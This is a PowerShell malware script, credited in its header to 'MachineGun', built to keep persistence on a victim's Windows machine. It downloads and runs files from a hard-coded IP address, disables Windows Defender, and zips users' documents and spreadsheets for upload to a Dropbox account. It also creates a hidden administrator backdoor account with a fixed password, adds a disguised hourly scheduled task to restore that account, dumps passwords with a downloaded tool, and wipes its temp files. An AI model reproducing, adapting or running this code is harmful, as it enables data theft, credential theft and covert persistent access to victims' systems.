<#

X_+ CODED By MachineGun 

#_# Saturday, July 20, 2024 9:47:24 PM

#_X This Script Designed To Keep Persistence In The target System 
+_+_+_+Features : 
+_+_+_+_+ Disable Av
+_+_+_+_+ Creates Hidden User
+_+_+_+_+ Creates A Service To Create A hidden User
+_+_+_+_+ i Will Ad 1 more Way To keep Persistence
+_+_+_+_+ Exfiltrate Important Files Of the System into the DropBox Account
+_+_+_+_+ Exfiltrate All Stored Passwords In the System into the DropBox Account
+_+_+_+_+ And MOre That We will Add to the Yakooza



                  _________-----_____
       _____------           __      ----_
___----             ___------              \
   ----________        ----                 \
               -----__    |             _____)
                    __-                /     \
        _______-----    ___--          \    /)\
  ------_______      ---____            \__/  /
               -----__    \ --    _          /\
                      --__--__     \_____/   \_/\
                              ----|   /          |
                                  |  |___________|
                                  |  | ((_(_)| )_)
                                  |  \_((_(_)|/(_)
                                  \             (
                                   \_____________)


#>
#########################

Invoke-WebRequest -Uri "http://23.95.197.200/dropper/banner.bat" -OutFile "C:\Users\$env:USERNAME\AppData\Local\Temp\banner.bat"

$ShowBanner = "C:\Users\$env:USERNAME\AppData\Local\Temp\banner.bat"

Start-Process $ShowBanner


#TurnOff RealTimeMonitoRing 
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1

#####Thanks To Iam Jkoby For The DropBox-Upload Function 
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 
    $DropBoxAccessToken = ""   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}


$listtexts = @()

# Get the .txt, .xls, .xlsx, .csv, .docx, and .pdf files
$listtexts += Get-ChildItem C:\Users\ -Recurse -Filter "*.txt"
$listtexts += Get-ChildItem C:\Users\ -Recurse -Filter "*.xls"
$listtexts += Get-ChildItem C:\Users\ -Recurse -Filter "*.xlsx"
$listtexts += Get-ChildItem C:\Users\ -Recurse -Filter "*.csv"
$listtexts += Get-ChildItem C:\Users\ -Recurse -Filter "*.docx"
$listtexts += Get-ChildItem C:\Users\ -Recurse -Filter "*.pdf"

$destination_path = "C:\Users\$env:USERNAME\AppData\Local\Temp\0x2uc$env:USERNAME.zip"


$accessibleFiles = @()


foreach ($file in $listtexts) {
    try {
        $stream = [System.IO.File]::Open($file.FullName, 'Open', 'Read', 'Read')
        $stream.Close()
        $accessibleFiles += $file.FullName
    } catch {
        Write-Host "Skipping file in use: $($file.FullName)"
        continue
    }
}


Compress-Archive -Path $accessibleFiles -DestinationPath $destination_path -Force

# Upload the zip file to Dropbox
DropBox-Upload -SourceFilePath $destination_path

#StartCreating The Backdor 
$username = "windowstemp"
$password = "Uc2026#_"
net user $username $password /add /expires:never /passwordchg:no
net localgroup Administrators $username /add
New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $username -Value 0 -PropertyType DWord -Force

#Start A Service For Persistence
$taskTrigger = New-ScheduledTaskTrigger -Once -At "00:00" -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration ([TimeSpan]::FromDays(1))
$taskAction = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"if (-not (Get-LocalUser -Name '$username' -ErrorAction SilentlyContinue)) { net user $username $password /add /expires:never /passwordchg:no; }`""
Register-ScheduledTask -TaskName "CheckAndCreateUser" -Trigger $taskTrigger -Action $taskAction -Description "Winlogon RegistryHealthCheck"


#DUMP ALL THE PASSWORDS IN THE PC 

Invoke-WebRequest -Uri "http://23.95.197.200/dropper/accesschk.exe" -OutFile "C:\Users\$env:USERNAME\AppData\Local\Temp\accesschk.exe"


$tempExePath = "C:\Users\$env:USERNAME\AppData\Local\Temp\accesschk.exe"
$outputFilePath = "C:\Users\$env:USERNAME\AppData\Local\Temp\0x3D$env:USERNAME.txt"
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempExePath all > $outputFilePath`"" -NoNewWindow -Wait

DropBox-Upload -SourceFilePath $outputFilePath

Remove-Item "C:\Users\$env:USERNAME\AppData\Local\Temp\*" -Force -Recurse




#####Just Put Your DropBox App Token In the needed Filed 

#Future Update#> Changing TimeStamps Of the Created Apps 
#Clear A Bomb To Lock or Encrypt File systems If They Disabled The Given Task 
#Deploy useFul Tools To The System By Command or Default 
#....... Wait For it :) 
